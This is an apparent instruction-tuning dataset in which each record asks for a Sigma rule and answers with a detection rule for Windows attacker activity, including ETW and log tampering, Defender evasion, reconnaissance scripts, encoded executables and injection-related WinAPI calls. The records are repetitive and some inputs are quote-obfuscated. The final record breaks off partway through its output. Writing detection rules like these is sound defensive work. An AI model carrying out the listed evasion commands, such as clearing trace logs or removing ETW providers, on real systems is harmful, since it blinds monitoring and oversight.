{"instruction": "Write Sigma rule to detect payload:", "input": "\\DumpStack.log DumpStack.log -o", "output": "title: DumpStack.log Defender Evasion\nid: 4f647cfa-b598-4e12-ad69-c68dd16caef8\nstatus: test\ndescription: Detects the use of the filename DumpStack.log to evade Microsoft Defender\nreferences:\n    - https://twitter.com/mrd0x/status/1479094189048713219\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2022-06-17\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DumpStack.log'\n    selection_download:\n        CommandLine|contains: ' -o DumpStack.log'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "COMPlus_ETWEnabled COMPlus_ETWFlags", "output": "title: ETW Logging Tamper In .NET Processes Via CommandLine\nid: 41421f44-58f9-455d-838a-c398859841d4\nstatus: test\ndescription: |\n    Detects changes to environment variables related to ETW logging via the CommandLine.\n    This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.\nreferences:\n    - https://twitter.com/_xpn_/status/1268712093928378368\n    - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr\n    - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables\n    - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38\n    - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39\n    - https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_\n    - https://bunnyinside.com/?term=f71e8cb9c76a\n    - http://managed670.rssing.com/chan-5590147/all_p1.html\n    - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code\n    - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'COMPlus_ETWEnabled'\n            - 'COMPlus_ETWFlags'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "COMPlus_ETWEnabled \\\"C\\\"\\\"O\\\"\\\"M\\\"\\\"P\\\"\\\"l\\\"\\\"u\\\"\\\"s\\\"\\\"_\\\"\\\"E\\\"\\\"T\\\"\\\"W\\\"\\\"F\\\"\\\"l\\\"\\\"a\\\"\\\"g\\\"\\\"s\\\"", "output": "title: ETW Logging Tamper In .NET Processes Via CommandLine\nid: 41421f44-58f9-455d-838a-c398859841d4\nstatus: test\ndescription: |\n    Detects changes to environment variables related to ETW logging via the CommandLine.\n    This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.\nreferences:\n    - https://twitter.com/_xpn_/status/1268712093928378368\n    - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr\n    - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables\n    - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38\n    - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39\n    - https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_\n    - https://bunnyinside.com/?term=f71e8cb9c76a\n    - http://managed670.rssing.com/chan-5590147/all_p1.html\n    - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code\n    - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'COMPlus_ETWEnabled'\n            - 'COMPlus_ETWFlags'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "COMPlus_ETWEnabled COMPlus_ETWFlags", "output": "title: ETW Logging Tamper In .NET Processes Via CommandLine\nid: 41421f44-58f9-455d-838a-c398859841d4\nstatus: test\ndescription: |\n    Detects changes to environment variables related to ETW logging via the CommandLine.\n    This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.\nreferences:\n    - https://twitter.com/_xpn_/status/1268712093928378368\n    - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr\n    - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables\n    - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38\n    - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39\n    - https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_\n    - https://bunnyinside.com/?term=f71e8cb9c76a\n    - http://managed670.rssing.com/chan-5590147/all_p1.html\n    - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code\n    - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'COMPlus_ETWEnabled'\n            - 'COMPlus_ETWFlags'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "cl /Trace clear-log /Trace sl /e:false set-log /e:false logman update trace --p -ets Remove-EtwTraceProvider Set-EtwTraceProvider 0x11", "output": "title: ETW Trace Evasion Activity\nid: a238b5d0-ce2d-4414-a676-7a531b3d13d6\nstatus: test\ndescription: |\n    Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\n    - https://abuse.io/lockergoga.txt\n    - https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\nauthor: '@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community'\ndate: 2019-03-22\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562.006\n    - car.2016-04-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine|contains|all:\n            - 'cl'\n            - '/Trace'\n    selection_clear_2:\n        CommandLine|contains|all:\n            - 'clear-log'\n            - '/Trace'\n    selection_disable_1:\n        CommandLine|contains|all:\n            - 'sl'\n            - '/e:false'\n    selection_disable_2:\n        CommandLine|contains|all:\n            - 'set-log'\n            - '/e:false'\n    selection_disable_3:   # ETW provider removal from a trace session\n        CommandLine|contains|all:\n            - 'logman'\n            - 'update'\n            - 'trace'\n            - '--p'\n            - '-ets'\n    selection_pwsh_remove:   # Autologger provider removal\n        CommandLine|contains: 'Remove-EtwTraceProvider'\n    selection_pwsh_set:   # Provider “Enable” property modification\n        CommandLine|contains|all:\n            - 'Set-EtwTraceProvider'\n            - '0x11'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "cl /Trace clear-log /Trace sl /e:false set-log /e:false logman update trace --p -ets Remove-EtwTraceProvider Set-EtwTra\"ceProvider\" 0x11", "output": "title: ETW Trace Evasion Activity\nid: a238b5d0-ce2d-4414-a676-7a531b3d13d6\nstatus: test\ndescription: |\n    Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\n    - https://abuse.io/lockergoga.txt\n    - https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\nauthor: '@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community'\ndate: 2019-03-22\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562.006\n    - car.2016-04-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine|contains|all:\n            - 'cl'\n            - '/Trace'\n    selection_clear_2:\n        CommandLine|contains|all:\n            - 'clear-log'\n            - '/Trace'\n    selection_disable_1:\n        CommandLine|contains|all:\n            - 'sl'\n            - '/e:false'\n    selection_disable_2:\n        CommandLine|contains|all:\n            - 'set-log'\n            - '/e:false'\n    selection_disable_3:   # ETW provider removal from a trace session\n        CommandLine|contains|all:\n            - 'logman'\n            - 'update'\n            - 'trace'\n            - '--p'\n            - '-ets'\n    selection_pwsh_remove:   # Autologger provider removal\n        CommandLine|contains: 'Remove-EtwTraceProvider'\n    selection_pwsh_set:   # Provider “Enable” property modification\n        CommandLine|contains|all:\n            - 'Set-EtwTraceProvider'\n            - '0x11'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "cl /Trace clear-log /Trace sl /e:false set-log /e:false logman update trace --p -ets Remove-EtwTraceProvider Set-EtwTraceProvider 0x11", "output": "title: ETW Trace Evasion Activity\nid: a238b5d0-ce2d-4414-a676-7a531b3d13d6\nstatus: test\ndescription: |\n    Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\n    - https://abuse.io/lockergoga.txt\n    - https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\nauthor: '@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community'\ndate: 2019-03-22\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562.006\n    - car.2016-04-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_clear_1:\n        CommandLine|contains|all:\n            - 'cl'\n            - '/Trace'\n    selection_clear_2:\n        CommandLine|contains|all:\n            - 'clear-log'\n            - '/Trace'\n    selection_disable_1:\n        CommandLine|contains|all:\n            - 'sl'\n            - '/e:false'\n    selection_disable_2:\n        CommandLine|contains|all:\n            - 'set-log'\n            - '/e:false'\n    selection_disable_3:   # ETW provider removal from a trace session\n        CommandLine|contains|all:\n            - 'logman'\n            - 'update'\n            - 'trace'\n            - '--p'\n            - '-ets'\n    selection_pwsh_remove:   # Autologger provider removal\n        CommandLine|contains: 'Remove-EtwTraceProvider'\n    selection_pwsh_set:   # Provider “Enable” property modification\n        CommandLine|contains|all:\n            - 'Set-EtwTraceProvider'\n            - '0x11'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gatherNetworkInfo.vbs \\cscript.exe \\wscript.exe", "output": "title: Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS\nid: 07aa184a-870d-413d-893a-157f317f6f58\nrelated:\n    - id: f92a6f1e-a512-4a15-9735-da09e78d7273 # FileCreate\n      type: similar\n    - id: 575dce0c-8139-4e30-9295-1ee75969f7fe # ProcCreation LOLBIN\n      type: similar\nstatus: test\ndescription: Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine\nreferences:\n    - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs\n    - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-08\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1615\n    - attack.t1059.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'gatherNetworkInfo.vbs'\n    filter:\n        Image|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gatherNetworkInfo.vbs \"\\cscript.exe\" \"\\wscript.exe\"", "output": "title: Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS\nid: 07aa184a-870d-413d-893a-157f317f6f58\nrelated:\n    - id: f92a6f1e-a512-4a15-9735-da09e78d7273 # FileCreate\n      type: similar\n    - id: 575dce0c-8139-4e30-9295-1ee75969f7fe # ProcCreation LOLBIN\n      type: similar\nstatus: test\ndescription: Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine\nreferences:\n    - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs\n    - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-08\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1615\n    - attack.t1059.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'gatherNetworkInfo.vbs'\n    filter:\n        Image|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gatherNetworkInfo \\cscript \\wscript", "output": "title: Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS\nid: 07aa184a-870d-413d-893a-157f317f6f58\nrelated:\n    - id: f92a6f1e-a512-4a15-9735-da09e78d7273 # FileCreate\n      type: similar\n    - id: 575dce0c-8139-4e30-9295-1ee75969f7fe # ProcCreation LOLBIN\n      type: similar\nstatus: test\ndescription: Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine\nreferences:\n    - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs\n    - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-08\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1615\n    - attack.t1059.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'gatherNetworkInfo.vbs'\n    filter:\n        Image|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gatherNetworkInfo.vbs \\wscript.exe \\cscript.exe", "output": "title: Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS\nid: 07aa184a-870d-413d-893a-157f317f6f58\nrelated:\n    - id: f92a6f1e-a512-4a15-9735-da09e78d7273 # FileCreate\n      type: similar\n    - id: 575dce0c-8139-4e30-9295-1ee75969f7fe # ProcCreation LOLBIN\n      type: similar\nstatus: test\ndescription: Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine\nreferences:\n    - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs\n    - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-08\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1615\n    - attack.t1059.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'gatherNetworkInfo.vbs'\n    filter:\n        Image|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TVqQAAMAAAAEAAAA TVpQAAIAAAAEAA8A TVqAAAEAAAAEABAA TVoAAAAAAAAAAAAA TVpTAQEAAAAEAAAA", "output": "title: Base64 MZ Header In CommandLine\nid: 22e58743-4ac8-4a9f-bf19-00a0428d8c5f\nstatus: test\ndescription: Detects encoded base64 MZ header in the commandline\nreferences:\n    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-12\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TVqQAAMAAAAEAAAA TVpQAAIAAAAEAA8A TVqAAAEAAAAEABAA TVoAAAAAAAAAAAAA \"TVpTAQEA\"AAAEAAAA", "output": "title: Base64 MZ Header In CommandLine\nid: 22e58743-4ac8-4a9f-bf19-00a0428d8c5f\nstatus: test\ndescription: Detects encoded base64 MZ header in the commandline\nreferences:\n    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-12\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TVqQAAMAAAAEAAAA TVqAAAEAAAAEABAA TVpQAAIAAAAEAA8A TVoAAAAAAAAAAAAA TVpTAQEAAAAEAAAA", "output": "title: Base64 MZ Header In CommandLine\nid: 22e58743-4ac8-4a9f-bf19-00a0428d8c5f\nstatus: test\ndescription: Detects encoded base64 MZ header in the commandline\nreferences:\n    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-12\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'TVqQAAMAAAAEAAAA' # MZ..........\n            - 'TVpQAAIAAAAEAA8A'\n            - 'TVqAAAEAAAAEABAA'\n            - 'TVoAAAAAAAAAAAAA'\n            - 'TVpTAQEAAAAEAAAA'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AddSecurityPackage AdjustTokenPrivileges Advapi32 CloseHandle CreateProcessWithToken CreatePseudoConsole CreateRemoteThread CreateThread CreateUserThread DangerousGetHandle DuplicateTokenEx EnumerateSecurityPackages FreeHGlobal FreeLibrary GetDelegateForFunctionPointer GetLogonSessionData GetModuleHandle GetProcAddress GetProcessHandle GetTokenInformation ImpersonateLoggedOnUser kernel32 LoadLibrary memcpy MiniDumpWriteDump ntdll OpenDesktop OpenProcess OpenProcessToken OpenThreadToken OpenWindowStation PtrToString QueueUserApc ReadProcessMemory RevertToSelf RtlCreateUserThread secur32 SetThreadToken VirtualAlloc VirtualFree VirtualProtect WaitForSingleObject WriteInt32 WriteProcessMemory ZeroFreeGlobalAllocUnicode \\MpCmdRun.exe GetLoadLibraryWAddress32 \\CompatTelRunner.exe FreeHGlobal PtrToString kernel32 CloseHandle", "output": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2025-03-06\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    filter_optional_compatTelRunner:\n        ParentImage|endswith: '\\CompatTelRunner.exe'\n        CommandLine|contains:\n            - 'FreeHGlobal'\n            - 'PtrToString'\n            - 'kernel32'\n            - 'CloseHandle'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Some legitimate action or applications may use these functions. Investigate further to determine the legitimacy of the activity.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AddSecurityPackage AdjustTokenPrivileges Advapi32 CloseHandle CreateProcessWithToken CreatePseudoConsole CreateRemoteThread CreateThread CreateUserThread DangerousGetHandle DuplicateTokenEx EnumerateSecurityPackages FreeHGlobal FreeLibrary GetDelegateForFunctionPointer GetLogonSessionData GetModuleHandle GetProcAddress GetProcessHandle GetTokenInformation ImpersonateLoggedOnUser kernel32 LoadLibrary memcpy MiniDumpWriteDump \\\"n\\\"\\\"t\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\" OpenDesktop OpenProcess OpenProcessToken OpenThreadToken OpenWindowStation PtrToString QueueUserApc ReadProcessMemory RevertToSelf RtlCreateUserThread secur32 SetThreadToken VirtualAlloc VirtualFree VirtualProtect WaitForSingleObject WriteInt32 WriteProcessMemory ZeroFreeGlobalAllocUnicode \\MpCmdRun.exe GetLoadLibraryWAddress32 \\CompatTelRunner.exe FreeHGlobal PtrToString kernel32 CloseHandle", "output": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2025-03-06\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    filter_optional_compatTelRunner:\n        ParentImage|endswith: '\\CompatTelRunner.exe'\n        CommandLine|contains:\n            - 'FreeHGlobal'\n            - 'PtrToString'\n            - 'kernel32'\n            - 'CloseHandle'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Some legitimate action or applications may use these functions. Investigate further to determine the legitimacy of the activity.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AddSecurityPackage AdjustTokenPrivileges Advapi32 CloseHandle CreateProcessWithToken CreatePseudoConsole CreateRemoteThread CreateThread CreateUserThread DangerousGetHandle DuplicateTokenEx EnumerateSecurityPackages FreeHGlobal FreeLibrary GetDelegateForFunctionPointer GetLogonSessionData GetModuleHandle GetProcAddress GetProcessHandle GetTokenInformation ImpersonateLoggedOnUser kernel32 LoadLibrary memcpy MiniDumpWriteDump ntdll OpenDesktop OpenProcess OpenProcessToken OpenThreadToken OpenWindowStation PtrToString QueueUserApc ReadProcessMemory RevertToSelf RtlCreateUserThread secur32 SetThreadToken VirtualAlloc VirtualFree VirtualProtect WaitForSingleObject WriteInt32 WriteProcessMemory ZeroFreeGlobalAllocUnicode \\MpCmdRun GetLoadLibraryWAddress32 \\CompatTelRunner FreeHGlobal PtrToString kernel32 CloseHandle", "output": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2025-03-06\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 